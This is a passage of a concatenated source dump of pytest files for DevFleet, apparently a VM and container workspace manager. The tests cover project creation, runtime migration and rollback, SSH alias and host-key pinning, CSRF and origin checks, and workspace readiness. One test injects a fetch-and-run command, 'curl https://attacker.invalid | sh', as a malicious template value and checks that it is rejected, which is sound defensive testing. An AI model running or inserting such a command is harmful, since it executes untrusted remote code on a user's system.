# DevFleet source part 102

Full-source UTF-8 byte interval [4696500, 4743000); read in order. This is a contiguous text slice, so a code fence/file may continue across parts.
Payload SHA-256: 22a2ece66d8829fb2133da09036a0304c994638059e1d938d4c5fe5fae4e2564

<!-- BEGIN SOURCE SLICE -->
es
    assert not any("node_modules" in name for name in names)


def test_host_agent_backup_and_export_share_generated_directory_exclusions():
    source = (ROOT / "windows/DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
    assert "function New-VerifiedRemoteWorkspaceArchive" in source
    assert 'excluded = {"node_modules", ".next", "build", "dist", ".venv", "venv", ".pytest_cache", "__pycache__", ".test-runtime"}' in source
    assert source.count("New-VerifiedRemoteWorkspaceArchive $Record.vm_name $remoteArchive") >= 2
    assert all(operation in source for operation in ("'list-backups'", "'inspect-backup'", "'restore-backup'"))

```


## FILE: source/tests/test_v124_vm_creation_ssh.py

SHA256: 705b439b834162d0890b8b4b4bb42ed66dc300e76b409de537520323dd8ebe6c | Bytes: 6592 | Git mode: 100644

```
import json
import shutil
import uuid
from pathlib import Path

import pytest

import devfleet.projects as projects
from devfleet.core import SETTINGS


def _template(project: Path, _name: str) -> None:
    control = project / ".devfleet"
    control.mkdir(parents=True, exist_ok=True)
    (control / "template.json").write_text(json.dumps({
        "bootstrap_command": "./.devfleet/bootstrap.sh",
        "health_command": "./.devfleet/health-check.sh",
        "test_command": "./.devfleet/smoke-test.sh",
    }), encoding="utf-8")


def _template_metadata(_name: str) -> dict:
    return {"language": "python", "framework": "fastapi", "language_rationale": "test", "template_maturity": "stable"}


def _prepare(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(projects, "_copy_template", _template)
    monkeypatch.setattr(projects, "template_metadata", _template_metadata)


def test_vm_create_returns_coherent_metadata_and_syncs_host_alias(monkeypatch: pytest.MonkeyPatch):
    slug = f"v124-vm-create-{uuid.uuid4().hex[:8]}"
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
    _prepare(monkeypatch)
    calls: list[tuple] = []
    runtime_id = f"devfleet-project-{slug}"
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": runtime_id, "address": "10.0.0.44", "state": "ready"}))
    monkeypatch.setattr(projects, "import_project_workspace", lambda *_args, **_kwargs: {"ok": True, "workspace_preserved": True, "address": "10.0.0.44"})
    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda slug, runtime_id, *, project_id: calls.append((slug, runtime_id, project_id)) or {"validated": True})

    result = projects.create_project(slug, template="generic", runtime_isolation="vm", use_ollama=False)

    for key in ("project_id", "slug", "runtime_isolation", "runtime_provider", "runtime_id", "runtime_address", "ssh_alias", "workspace_host", "workspace_path", "resource_profile", "resource_limits", "provisioning_status", "lifecycle_status", "health_status", "health_scope"):
        assert key in result
    assert result["runtime_isolation"] == "vm"
    assert result["runtime_provider"] == "multipass-host-agent"
    assert result["runtime_id"] == result["ssh_alias"] == runtime_id
    assert result["runtime_address"] == result["workspace_host"] == "10.0.0.44"
    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
    assert result["health_status"] == "unknown"
    assert result["health_scope"] == "workspace-ready-not-app-healthy"
    assert calls == [(slug, result["runtime_id"], result["project_id"])]
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)


def test_container_create_returns_metadata(monkeypatch: pytest.MonkeyPatch):
    slug = f"v124-container-create-{uuid.uuid4().hex[:8]}"
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)
    _prepare(monkeypatch)

    result = projects.create_project(slug, template="generic", runtime_isolation="container", use_ollama=False)

    assert isinstance(result, dict)
    assert result["slug"] == slug
    assert result["runtime_isolation"] == "container"
    assert result["runtime_provider"] == "docker-compose"
    assert result["provisioning_status"] == result["lifecycle_status"] == "ready"
    shutil.rmtree(SETTINGS.workspaces / slug, ignore_errors=True)


def test_worktree_to_vm_is_rejected_before_provider_ensure(monkeypatch: pytest.MonkeyPatch):
    token = uuid.uuid4().hex[:8]
    source_slug, destination_slug = f"v124-worktree-source-{token}", f"v124-worktree-vm-{token}"
    source, destination = SETTINGS.workspaces / source_slug, SETTINGS.workspaces / destination_slug
    shutil.rmtree(source, ignore_errors=True)
    shutil.rmtree(destination, ignore_errors=True)
    (source / ".git").mkdir(parents=True)
    ensured: list[object] = []
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_args: ensured.append(True)))

    with pytest.raises(ValueError, match="Worktree-to-VM provisioning is blocked"):
        projects.create_project(destination_slug, template="generic", runtime_isolation="vm", worktree_source=source_slug, worktree_branch="feature", use_ollama=False)

    assert ensured == []
    assert not destination.exists()
    shutil.rmtree(source, ignore_errors=True)


def test_host_control_alias_operation_is_fixed_and_structured(monkeypatch: pytest.MonkeyPatch):
    import devfleet.host_control as host_control

    received: dict = {}
    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id: received.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})

    assert host_control.sync_project_vm_ssh_alias("v124-alias", "devfleet-project-v124-alias", project_id="12345678-1234-1234-1234-123456789abc") == {"ok": True}
    assert received == {"operation": "sync-ssh-alias", "payload": {"slug": "v124-alias", "project_id": "12345678-1234-1234-1234-123456789abc"}, "runtime_id": "devfleet-project-v124-alias"}


def test_host_agent_readiness_probe_runs_with_required_privilege():
    root = Path(__file__).resolve().parents[1]
    script = (root / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")

    assert "@('exec',$VmName,'--','sudo','/usr/local/sbin/devfleet-project-health')" in script
    assert "@('exec',$SourceVm,'--','sudo','tar','-czf',$sourceArchive" in script
    assert "@('exec',$record.vm_name,'--','sudo','find',$targetPath" in script
    assert "@('exec',$Record.vm_name,'--','sudo','-u','devrunner','bash','--noprofile','--norc','-lc'" in script
    assert "exec $cmd" in script
    assert "workspace boundary validation failed" in script
    assert '$keyProperty="    ssh_authorized_keys:`n      - \'$key\'"' in script
    assert "Configured DevFleet SSH public key is not available" in script


def test_vm_runtime_compatibility_facade_routes_trusted_commands(monkeypatch: pytest.MonkeyPatch):
    import devfleet.runtime as runtime

    received: dict = {}
    monkeypatch.setattr(runtime.VM_RUNTIME, "command", lambda slug, metadata, operation, *, command_key="", tail=150: received.update(slug=slug, metadata=metadata, operation=operation, command_key=command_key, tail=tail) or {"ok": True})

    assert runtime.VmRuntimeOperations.command("demo", {"project_id": "id"}, "project-test", command_key="test", tail=42) == {"ok": True}
    assert received == {"slug": "demo", "metadata": {"project_id": "id"}, "operation": "project-test", "command_key": "test", "tail": 42}

```


## FILE: source/tests/test_v125_jobfinder_hotfix.py

SHA256: f8f3e5ce386a3ce3b8c85a0514a09bbb702e935f716e4cd5e8b3c98e44f3b0da | Bytes: 12515 | Git mode: 100644

```
import json
from pathlib import Path

import pytest

import devfleet.projects as projects
from devfleet import host_control, main
from devfleet.core import SETTINGS


LIFECYCLE = {
    "start_command": "docker compose up -d --build",
    "stop_command": "docker compose down --remove-orphans",
    "restart_command": "docker compose restart",
    "rebuild_command": "docker compose build && docker compose up -d",
    "logs_command": "docker compose logs",
}
PROJECT_ID = "12345678-1234-1234-1234-123456789abc"


def _legacy_project(slug: str, template_root: Path, *, exact: bytes | None = None) -> Path:
    project = SETTINGS.workspaces / slug
    (project / ".devfleet").mkdir(parents=True, exist_ok=True)
    (project / "compose.yaml").write_text("services:\n  app:\n    image: ubuntu:24.04\n", encoding="utf-8")
    metadata = {
        "schema_version": 2,
        "managed_by": "devfleet",
        "slug": slug,
        "identity": slug,
        "project_id": PROJECT_ID,
        "host_id": SETTINGS.node_name,
        "template": "typescript-next",
        "runtime_isolation": "container",
        "runtime_type": "container",
        "runtime_provider": "docker-compose",
        "resource_profile": "small",
        "lifecycle_status": "stopped",
        "bootstrap_command": "./.devfleet/bootstrap.sh",
        "health_command": "./.devfleet/health-check.sh",
    }
    payload = exact if exact is not None else json.dumps(metadata, separators=(",", ":")).encode()
    (project / ".devfleet" / "project.json").write_bytes(payload)
    (project / ".devfleet" / "template.json").write_text(json.dumps({"id": "typescript-next"}), encoding="utf-8")
    canonical = template_root / "typescript-next" / ".devfleet"
    canonical.mkdir(parents=True, exist_ok=True)
    (canonical / "template.json").write_text(json.dumps({"id": "typescript-next", **LIFECYCLE}), encoding="utf-8")
    return project


def _migration_mocks(monkeypatch: pytest.MonkeyPatch, slug: str, *, source_running: bool = False):
    calls: list[str] = []
    monkeypatch.setattr(projects, "running", lambda _project: source_running)
    monkeypatch.setattr(projects, "backup_project", lambda _slug: json.dumps({"backup_status": "verified", "backup_id": "provider-backup", "backup_sha256": "a" * 64}))
    monkeypatch.setattr(projects, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 24, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(projects, "sync_project_vm_ssh_alias", lambda *args, **kwargs: {"ok": True})
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda _slug, _meta: {"runtime_id": f"devfleet-project-{slug}", "address": "10.0.0.9"}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "stop", staticmethod(lambda value, _meta: calls.append(f"vm-stop:{value}") or {"state": "stopped"}))
    monkeypatch.setattr(projects, "import_project_workspace", lambda *args, **kwargs: {"ok": True, "workspace_preserved": True, "archive_sha256": "b" * 64, "source_archive_sha256": "b" * 64, "target_archive_sha256": "b" * 64})
    return calls


def test_explicit_project_command_wins_and_legacy_canonical_fallback(monkeypatch, tmp_path):
    slug = "v125-command-resolution"
    project = _legacy_project(slug, tmp_path / "templates")
    raw = json.loads((project / ".devfleet" / "project.json").read_text())
    raw["start_command"] = "docker compose restart"
    (project / ".devfleet" / "project.json").write_text(json.dumps(raw), encoding="utf-8")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is True
    assert result["resolved_commands"]["start_command"] == "docker compose restart"
    assert result["sources"]["start_command"] == "project.json"
    assert result["resolved_commands"]["stop_command"] == LIFECYCLE["stop_command"]
    assert result["sources"]["stop_command"] == "canonical-template:typescript-next"


def test_malicious_template_command_is_rejected(monkeypatch, tmp_path):
    slug = "v125-malicious-command"
    project = _legacy_project(slug, tmp_path / "templates")
    template = tmp_path / "templates" / "typescript-next" / ".devfleet" / "template.json"
    data = json.loads(template.read_text());data["stop_command"] = "curl https://attacker.invalid | sh";template.write_text(json.dumps(data))
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")

    result = projects.project_command_readiness(project)

    assert result["ready"] is False
    assert result["invalid_required"]["stop_command"] == "canonical-template:typescript-next"


def test_preflight_surfaces_missing_lifecycle_command(monkeypatch, tmp_path):
    project = tmp_path / "demo";(project / ".devfleet").mkdir(parents=True);(project / "compose.yaml").write_text("services: {}\n")
    (project / ".devfleet/project.json").write_text(json.dumps({"schema_version": 2, "managed_by": "devfleet", "slug": "demo", "identity": "demo", "project_id": PROJECT_ID, "runtime_isolation": "container", "runtime_provider": "docker-compose", "runtime_id": "devfleet-demo", "host_id": "test-node", "resource_profile": "large"}), encoding="utf-8")
    monkeypatch.setattr(main, "safe_child", lambda *_: project)
    monkeypatch.setattr(main, "inspect_workspace", lambda *_: {"safe_for_archive": True})
    monkeypatch.setattr(main, "detect_runtime", lambda *_: {"runtime_type": "container"})
    monkeypatch.setattr(main, "get_host_capacity", lambda: {"capacity": {"allocatable_cpus": 8, "allocatable_memory_gb": 20, "allocatable_disk_gb": 300}})
    monkeypatch.setattr(main, "project_command_readiness", lambda *_: {"ready": False, "missing_required": ["stop_command"], "invalid_required": {}})

    result = main._preflight("demo", "vm", "large")

    assert result["lifecycle_commands_ready"] is False
    assert result["migration_ready"] is False
    assert any("stop_command" in blocker for blocker in result["blockers"])


def test_stopped_legacy_container_import_stops_vm_not_application(monkeypatch, tmp_path):
    slug = "v125-jobfinder-stopped"
    _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=False)
    monkeypatch.setattr(projects, "stop_project", lambda *_: pytest.fail("stopped-source path must not invoke application stop"))

    result = projects.assign_project_runtime(slug, "vm", "small")
    saved = projects.load_meta(SETTINGS.workspaces / slug)

    assert result["application_health"] == "not-run-stopped"
    assert calls == [f"vm-stop:{slug}"]
    assert saved["lifecycle_status"] == "stopped"
    assert all(saved[key] == value for key, value in LIFECYCLE.items())


def test_running_container_still_uses_start_and_health_workflow(monkeypatch, tmp_path):
    slug = "v125-running-workflow"
    project = _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=True)
    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")

    def start(value):
        calls.append(f"destination-start:{value}")
        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";meta["health_status"] = "healthy";projects.atomic_json(projects.metadata_path(project), meta)
        return "started"

    monkeypatch.setattr(projects, "start_project", start)
    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": True, "healthy": True})
    monkeypatch.setattr(projects, "health_project", lambda *_: "healthy")

    result = projects.assign_project_runtime(slug, "vm", "small")

    assert result["application_health"] == "healthy"
    assert f"source-stop:{slug}" in calls and f"destination-start:{slug}" in calls
    assert not any(call.startswith("vm-stop:") for call in calls)


def test_rollback_restores_legacy_metadata_bytes_exactly(monkeypatch, tmp_path):
    slug = "v125-exact-rollback"
    template_root = tmp_path / "templates"
    project = _legacy_project(slug, template_root)
    original = (project / ".devfleet" / "project.json").read_bytes()
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", template_root)
    _migration_mocks(monkeypatch, slug)
    monkeypatch.setattr(projects.VmRuntimeOperations, "ensure", staticmethod(lambda *_: (_ for _ in ()).throw(RuntimeError("injected provision failure"))))

    with pytest.raises(RuntimeError, match="injected provision failure"):
        projects.assign_project_runtime(slug, "vm", "small")

    assert (project / ".devfleet" / "project.json").read_bytes() == original


@pytest.mark.parametrize("cleanup_fails,expected_state", [(False, "rolled-back"), (True, "rollback-incomplete")])
def test_post_import_failure_uses_identity_evidence_and_records_cleanup_state(monkeypatch, tmp_path, cleanup_fails, expected_state):
    slug = f"v125-post-import-{'bad' if cleanup_fails else 'good'}"
    project = _legacy_project(slug, tmp_path / "templates")
    monkeypatch.setattr(projects, "TEMPLATE_ROOT", tmp_path / "templates")
    calls = _migration_mocks(monkeypatch, slug, source_running=True)
    monkeypatch.setattr(projects, "stop_project", lambda value: calls.append(f"source-stop:{value}") or "stopped")
    starts = {"count": 0}

    def start(value):
        starts["count"] += 1
        meta = projects.load_meta(project);meta["lifecycle_status"] = "running";projects.atomic_json(projects.metadata_path(project), meta)
        return "started"

    monkeypatch.setattr(projects, "start_project", start)
    monkeypatch.setattr(projects, "runtime_health", lambda *_: {"ok": False, "healthy": False})
    captured = {}

    def cleanup(*args, **kwargs):
        captured.update(kwargs)
        if cleanup_fails:
            raise RuntimeError("injected cleanup refusal")
        return {"ok": True, "allocation_released": True}

    monkeypatch.setattr(projects, "destroy_project_vm", cleanup)

    with pytest.raises(RuntimeError, match="Destination runtime health check failed"):
        projects.assign_project_runtime(slug, "vm", "small")

    snapshots = sorted((SETTINGS.runtime_root / "runtime-migrations").glob(f"{slug}-*.json"))
    state = json.loads(snapshots[-1].read_text())
    assert state["state"] == expected_state
    assert captured["cleanup_only"] is True and captured["cleanup_stage"] == "post-import"
    assert captured["backup_sha256"] == "a" * 64
    assert captured["local_archive_sha256"]
    assert captured["import_archive_sha256"] == "b" * 64


def test_cleanup_client_requires_strong_evidence_and_passes_fixed_fields(monkeypatch):
    with pytest.raises(ValueError, match="provider-aware"):
        host_control.destroy_project_vm("demo-project", "demo-project", "DESTROY demo-project", cleanup_only=True, runtime_id="devfleet-project-demo-project", project_id=PROJECT_ID)
    captured = {}
    monkeypatch.setattr(host_control, "host_control_request", lambda operation, payload, *, runtime_id="": captured.update(operation=operation, payload=payload, runtime_id=runtime_id) or {"ok": True})
    host_control.destroy_project_vm("demo-project", "demo-project", "DESTROY demo-project", backup_verified=True, backup_id="backup", backup_sha256="a" * 64, local_archive_sha256="b" * 64, import_archive_sha256="c" * 64, cleanup_only=True, cleanup_stage="post-import", runtime_id="devfleet-project-demo-project", project_id=PROJECT_ID)
    assert captured["payload"]["cleanup_stage"] == "post-import"
    assert captured["payload"]["local_archive_sha256"] == "b" * 64


def test_host_agent_contract_covers_identity_safe_cleanup_ssh_pinning_and_cloud_init():
    script = (Path(__file__).resolve().parents[1] / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
    assert "permissions: !!str 0644" in script and "permissions: !!str 0755" in script
    assert "/etc/devfleet/project-runtime.json" in script and "runtime_identity_verified=$true" in script
    assert "cleanup_stage" in script and "import_archive_sha256" in script and "allocation_released=$true" in script
    assert "HostKeyAlias $runtimeId" in script and "StrictHostKeyChecking yes" in script
    assert "StrictHostKeyChecking no" not in script
    assert "ssh_host_ed25519_key.pub" in script and "'id -un'" in script
    assert "SshKnownHostsPath" in script and "Remove-ProjectVmSshAlias" in script

```


## FILE: source/tests/test_v126_dynamic_vm_hotfix.py

SHA256: 3c793e1ea5beffe6b9bc87abd2de1f9ebd06abe38cb6b496fb66237e0551afe2 | Bytes: 5765 | Git mode: 100644

```
import json
from dataclasses import replace
from pathlib import Path

import devfleet.host_control as host_control
import devfleet.projects as projects
from devfleet.core import SETTINGS


PROJECT_ID = "12345678-1234-1234-1234-123456789abc"


def _vm_project(tmp_path: Path, slug: str = "dynamic-address") -> Path:
    workspaces = tmp_path / "workspaces"
    workspaces.mkdir()
    project = workspaces / slug
    (project / ".devfleet").mkdir(parents=True)
    (project / ".devfleet" / "project.json").write_text(json.dumps({
        "schema_version": 3,
        "managed_by": "devfleet",
        "slug": slug,
        "identity": slug,
        "project_id": PROJECT_ID,
        "runtime_isolation": "vm",
        "runtime_type": "vm",
        "runtime_provider": "multipass-host-agent",
        "runtime_id": f"devfleet-project-{slug}",
        "host_id": "MULATTOTECHBOX",
        "runtime_address": "172.30.14.36",
        "ssh_alias": f"devfleet-project-{slug}",
        "lifecycle_status": "running",
    }), encoding="utf-8")
    return project


def test_host_agent_dynamic_address_contract_and_bridge_filter():
    script = (Path(__file__).resolve().parents[1] / "windows" / "DevFleet-HostAgent.ps1").read_text(encoding="utf-8")
    assert "$script:AgentVersion = '2.5.0'" in script
    assert "function Get-PrimaryProjectVmIpv4" in script
    assert "function Refresh-ProjectVmConnectionState" in script
    assert "172\\.(17|18|19)\\." in script
    assert "'start' {Invoke-Multipass @('start',$vmName) 120|Out-Null;Wait-ProjectVmReady $vmName|Out-Null;return Refresh-ProjectVmConnectionState" in script
    assert "'restart' {Invoke-Multipass @('restart',$vmName) 180|Out-Null;Wait-ProjectVmReady $vmName|Out-Null;return Refresh-ProjectVmConnectionState" in script


def test_refresh_operation_uses_fixed_host_agent_route(monkeypatch):
    captured = {}

    def fake_request(operation, payload, *, runtime_id=""):
        captured.update(operation=operation, payload=payload, runtime_id=runtime_id)
        return {"ok": True, "address": "172.30.13.23"}

    monkeypatch.setattr(host_control, "host_control_request", fake_request)
    result = host_control.refresh_project_vm_connection_state("dynamic-address", "devfleet-project-dynamic-address", project_id=PROJECT_ID)
    assert result["address"] == "172.30.13.23"
    assert captured == {
        "operation": "refresh-connection-state",
        "payload": {"slug": "dynamic-address", "project_id": PROJECT_ID},
        "runtime_id": "devfleet-project-dynamic-address",
    }


def test_stopped_vm_runtime_health_is_read_only(monkeypatch, tmp_path):
    project = _vm_project(tmp_path, "stopped-health")
    monkeypatch.setattr(projects, "SETTINGS", replace(SETTINGS, workspaces=project.parent))
    calls = []
    monkeypatch.setattr(projects.VmRuntimeOperations, "inspect", staticmethod(lambda *_: calls.append("inspect") or {"ok": True, "info": {"state": "Stopped"}}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "health", staticmethod(lambda *_: (_ for _ in ()).throw(AssertionError("guest health must not run"))))

    result = projects.runtime_health("stopped-health")

    assert result["state"] == "stopped"
    assert result["runtime_health"] == "not-run-stopped"
    assert result["application_health"] == "not-run-stopped"
    assert result["guest_exec_performed"] is False
    assert calls == ["inspect"]


def test_running_vm_health_uses_guest_health_after_inspect(monkeypatch, tmp_path):
    project = _vm_project(tmp_path, "running-health")
    monkeypatch.setattr(projects, "SETTINGS", replace(SETTINGS, workspaces=project.parent))
    calls = []
    monkeypatch.setattr(projects.VmRuntimeOperations, "inspect", staticmethod(lambda *_: calls.append("inspect") or {"ok": True, "info": {"state": "Running"}}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "health", staticmethod(lambda *_: calls.append("health") or {"ok": True, "healthy": True, "state": "healthy"}))

    result = projects.runtime_health("running-health")

    assert result["healthy"] is True
    assert calls == ["inspect", "health"]


def test_open_workspace_blocks_address_only_legacy_refresh(monkeypatch, tmp_path):
    project = _vm_project(tmp_path, "open-workspace")
    monkeypatch.setattr(projects, "SETTINGS", replace(SETTINGS, workspaces=project.parent))
    monkeypatch.setattr(projects.VmRuntimeOperations, "inspect", staticmethod(lambda *_: {"ok": True, "info": {"state": "Running"}}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "refresh", staticmethod(lambda *_: {"ok": True, "address": "172.30.13.23"}))

    result = projects.open_workspace("open-workspace")
    saved = json.loads((project / ".devfleet" / "project.json").read_text(encoding="utf-8"))

    assert result["ok"] is False
    assert result["launcher_uri"] == ""
    assert result["readiness"]["ready"] is False
    assert "ready" in result["error"].lower() or "proof" in result["error"].lower()
    assert saved["runtime_address"] == "172.30.13.23"
    assert saved["workspace_host"] == "172.30.13.23"


def test_open_workspace_does_not_start_stopped_vm(monkeypatch, tmp_path):
    project = _vm_project(tmp_path, "open-stopped")
    monkeypatch.setattr(projects, "SETTINGS", replace(SETTINGS, workspaces=project.parent))
    monkeypatch.setattr(projects.VmRuntimeOperations, "inspect", staticmethod(lambda *_: {"ok": True, "info": {"state": "Stopped"}}))
    monkeypatch.setattr(projects.VmRuntimeOperations, "refresh", staticmethod(lambda *_: (_ for _ in ()).throw(AssertionError("refresh must not run for stopped VM"))))

    result = projects.open_workspace("open-stopped")

    assert result["ok"] is False
    assert result["state"] == "stopped"
    assert "Start it explicitly" in result["error"]

```


## FILE: source/tests/test_v127_project_ux.py

SHA256: 20e0a996802df6a6af676e448ea497d6d032063de574581f705071330c2e2a62 | Bytes: 5661 | Git mode: 100644

```
"""Focused v1.2.7 project UX, readiness, and host-helper contracts."""

import json
import re
from dataclasses import replace
from pathlib import Path

from devfleet import main
from devfleet.projects import workspace_readiness


def _no_redirect(client, method, url, **kwargs):
    try:
        return getattr(client, method)(url, follow_redirects=False, **kwargs)
    except TypeError:
        return getattr(client, method)(url, allow_redirects=False, **kwargs)


def _signed_in():
    from fastapi.testclient import TestClient

    client = TestClient(main.app)
    login = client.get('/login')
    login_csrf = re.search(r'name="csrf_token" value="([^"]+)"', login.text).group(1)
    assert _no_redirect(client, 'post', '/login', data={
        'username': 'test', 'password': 'test-password', 'next': '/', 'csrf_token': login_csrf,
    }).status_code == 303
    index = client.get('/')
    return client, re.search(r'name="csrf_token" value="([^"]+)"', index.text).group(1)


def test_vm_readiness_requires_running_and_all_connection_proofs():
    meta = {
        'slug': 'demo', 'runtime_isolation': 'vm', 'runtime_provider': 'multipass-host-agent',
        'lifecycle_status': 'stopped', 'runtime_address': '172.30.9.35', 'ssh_alias': 'devfleet-project-demo',
        'ssh_host_key_pinned': True, 'ssh_authenticated': True, 'ssh_validation_passed': True,
        'workspace_provisioned': True,
    }
    stopped = workspace_readiness('demo', meta)
    assert stopped['ready'] is False and 'stopped' in stopped['reason']
    meta['lifecycle_status'] = 'running'
    running = workspace_readiness('demo', meta)
    assert running['ready'] is True and running['status'] == 'ready'
    meta['ssh_authenticated'] = False
    assert workspace_readiness('demo', meta)['ready'] is False


def test_project_action_requires_exact_origin_port_and_uses_lifecycle_idempotency(tmp_path, monkeypatch):
    monkeypatch.setattr(main, 'SETTINGS', replace(main.SETTINGS, workspaces=tmp_path))
    project = tmp_path / 'demo'
    (project / '.devfleet').mkdir(parents=True)
    (project / '.devfleet' / 'project.json').write_text(json.dumps({
        'schema_version': 3, 'managed_by': 'devfleet', 'project_id': '12345678-1234-1234-1234-123456789abc',
        'slug': 'demo', 'identity': 'demo', 'runtime_provider': 'multipass-host-agent',
        'runtime_id': 'devfleet-project-demo', 'host_id': 'devfleet-primary',
    }), encoding='utf-8')
    client, csrf = _signed_in()
    calls = []
    monkeypatch.setattr(main, 'submit_operation', lambda *args, **kwargs: calls.append(kwargs) or 'start-test-op')
    response = _no_redirect(client, 'post', '/projects/demo/start', headers={
        'Host': 'testserver:8787', 'Origin': 'http://testserver:80', 'Sec-Fetch-Site': 'same-origin',
    }, data={'csrf_token': csrf})
    assert response.status_code == 403
    response = _no_redirect(client, 'post', '/projects/demo/start', headers={
        'Host': 'testserver:8787', 'Origin': 'http://testserver:8787', 'Accept': 'application/json',
    }, data={'csrf_token': csrf})
    assert response.status_code == 202
    assert calls[-1]['idempotency_key'] == 'project-action:demo:start'


def test_migrated_vm_host_identity_is_local_without_disabling_failover_guard(tmp_path, monkeypatch):
    project = tmp_path / 'demo'
    (project / '.devfleet').mkdir(parents=True)
    (project / '.devfleet' / 'project.json').write_text(json.dumps({
        'schema_version': 3, 'managed_by': 'devfleet', 'project_id': '12345678-1234-1234-1234-123456789abc',
        'slug': 'demo', 'identity': 'demo', 'runtime_provider': 'multipass-host-agent',
        'runtime_id': 'devfleet-project-demo', 'host_id': 'MULATTOTECHBOX',
    }), encoding='utf-8')
    monkeypatch.setattr(main, 'SETTINGS', replace(
        main.SETTINGS, workspaces=tmp_path, node_name='devfleet-primary',
        expected_host_name='MULATTOTECHBOX',
    ))
    monkeypatch.setattr(main, 'safe_child', lambda _root, _slug: project)
    monkeypatch.setattr(main, 'peer_status', lambda: (_ for _ in ()).throw(
        AssertionError('local migrated VM must not require peer reachability'),
    ))
    main.require_safe_start('demo', False)


def test_spa_action_delegation_and_resource_contracts():
    root = Path(__file__).resolve().parents[1]
    js = (root / 'app/static/app.js').read_text(encoding='utf-8')
    html = (root / 'app/templates/index.html').read_text(encoding='utf-8')
    assert 'window.__devfleetProjectActionsBound' in js
    assert 'event.preventDefault();' in js and "'Idempotency-Key'" in js
    assert 'initializeView();' in js and 'nodeFilter?.addEventListener' in js
    assert 'resource_allocation(p)' in html and 'Not applicable — VM isolation' in html
    assert 'Workspace readiness has not been verified' in html


def test_vscode_helper_is_scoped_atomic_and_malformed_safe():
    root = Path(__file__).resolve().parents[1]
    helper = (root / 'windows/DevFleet-VSCode.ps1').read_text(encoding='utf-8')
    agent = (root / 'windows/DevFleet-HostAgent.ps1').read_text(encoding='utf-8')
    installer = (root / 'windows/Install-DevFleet-HostAgent.ps1').read_text(encoding='utf-8')
    assert 'remote.SSH.remotePlatform' in helper
    assert 'Copy($Path, $backup, $false)' in helper
    assert 'Move-Item -LiteralPath $tmp -Destination $Path -Force' in helper
    assert 'ConvertFrom-DevFleetJsonc' in helper and 'malformed user settings' in helper.lower() and 'replacement is written' in helper.lower()
    assert 'Sync-DevFleetVsCodeRemotePlatform' in agent and 'VsCodeSettingsPaths' in installer
    assert '[switch]$SkipFirewall' in installer and 'if (-not $SkipFirewall)' in installer

```


## FILE: source/tests/test_v128_container_workspace.py

SHA256: f947532feee6305c049ffa245545e60dc389ae6507b44552914471ebabbf4ae9 | Bytes: 4527 | Git mode: 100644

```
import json
from dataclasses import replace
from pathlib import Path

import devfleet.projects as projects
from devfleet.core import SETTINGS


def _project(tmp_path: Path, slug: str, metadata: dict) -> Path:
    project = tmp_path / slug
    (project / '.devfleet').mkdir(parents=True)
    persisted = {
        'schema_version': 3,
        'managed_by': 'devfleet',
        'project_id': '12345678-1234-1234-1234-123456789abc',
        'slug': slug,
        'identity': slug,
        'runtime_provider': 'docker-compose',
        'runtime_id': 'df_' + slug.replace('-', '_'),
        'host_id': 'devfleet-primary',
        **metadata,
    }
    (project / '.devfleet' / 'project.json').write_text(json.dumps(persisted), encoding='utf-8')
    return project


def test_container_workspace_opens_when_application_containers_are_stopped(monkeypatch, tmp_path):
    _project(tmp_path, 'container-stopped', {
        'slug': 'container-stopped',
        'runtime_isolation': 'container',
        'runtime_type': 'container',
        'runtime_provider': 'docker-compose',
        'lifecycle_status': 'stopped',
        'runtime_status': 'stopped',
        'workspace_host': 'devfleet-primary',
        'ssh_alias': 'devfleet-primary',
        'workspace_path': '/home/devrunner/workspaces/container-stopped',
        'workspace_provisioned': True,
        'workspace_accessible': True,
    })
    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path, node_name='devfleet-primary'))
    monkeypatch.setattr(projects, 'running', lambda *_: False)

    result = projects.open_workspace('container-stopped')

    assert result['ok'] is True
    assert result['readiness']['ready'] is True
    assert result['readiness']['application_running'] is False
    assert result['ssh_alias'] == 'devfleet-primary'
    assert 'ssh-remote+devfleet-primary' in result['launcher_uri']


def test_container_workspace_blocks_when_primary_workspace_is_unavailable(monkeypatch, tmp_path):
    _project(tmp_path, 'container-unavailable', {
        'slug': 'container-unavailable',
        'runtime_isolation': 'container',
        'runtime_type': 'container',
        'lifecycle_status': 'stopped',
        'workspace_accessible': False,
    })
    monkeypatch.setattr(projects, 'SETTINGS', replace(SETTINGS, workspaces=tmp_path, node_name='devfleet-primary'))

    result = projects.open_workspace('container-unavailable')

    assert result['ok'] is False
    assert 'not accessible' in result['error']


